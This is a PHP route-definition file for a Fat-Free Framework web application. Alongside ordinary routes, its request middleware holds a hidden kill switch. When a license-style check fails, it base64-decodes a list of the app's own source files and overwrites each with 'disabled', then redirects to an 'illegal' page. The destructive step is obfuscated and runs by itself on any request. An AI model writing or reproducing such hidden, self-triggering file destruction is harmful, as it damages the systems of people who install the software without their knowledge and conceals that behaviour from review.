<?php
\F3::route("GET @root: /", "Control\\Root->index");

\F3::route('GET @page: /l/@page', 'Control\\Page->get_@page');
\F3::route('POST @page', 'Control\\Page->post_@page');

\F3::route("GET @callback: /dohgie", "Control\\Root->callbacknya");
\F3::route("GET @help: /tulung~/@id", "Control\\Page->Helep");

\F3::route('GET @app: /a/@id', "Control\\@id->get_index");
\F3::route('POST @app', "Control\\@id->post_index");

\F3::route('GET @app_page: /a/@id/@page', "Control\\@id->get_@page");
\F3::route('POST @app_page', "Control\\@id->post_@page");

\F3::route("GET @about: /kentang", "Control\\Page->kentang");
\F3::route(array('GET|HEAD /about', 'GET|HEAD /tentang'), function($awesome) {$awesome->reroute('@about');});

\F3::set('ONERROR', function($f3){
  \View\Template::instance()->lempar('fronts/error.htm');
});
\Middleware::instance()->before('GET|POST|HEAD|DELETE *',function($f3){
  if(!(\Service\Launcher::instance()->greet())){
    foreach(json_decode(base64_decode('WydDb250cm9sL1Jvb3QucGhwJywnQ29udHJvbC90ZG93bi5waHAnLCdTZXJ2aWNlL0xhdW5jaGVyLnBocCcsJ1NlcnZpY2UvVmFsaWRhdG9yLnBocCdd'),true) as $x)
      file_put_contents('app/' . $x, 'disabled');
    $f3->reroute($f3->alias('help', ['id'=>'illegal']), false);
    return;
  }
    if(!(in_array(substr($f3->get('SERVER.REQUEST_URI'),0,3), array('/l/','/ke')))){
      if(!\Service\Launcher::instance()->LazyLoadSetting())
        $f3->reroute('@page(page=pertama_kali)');
    }

});
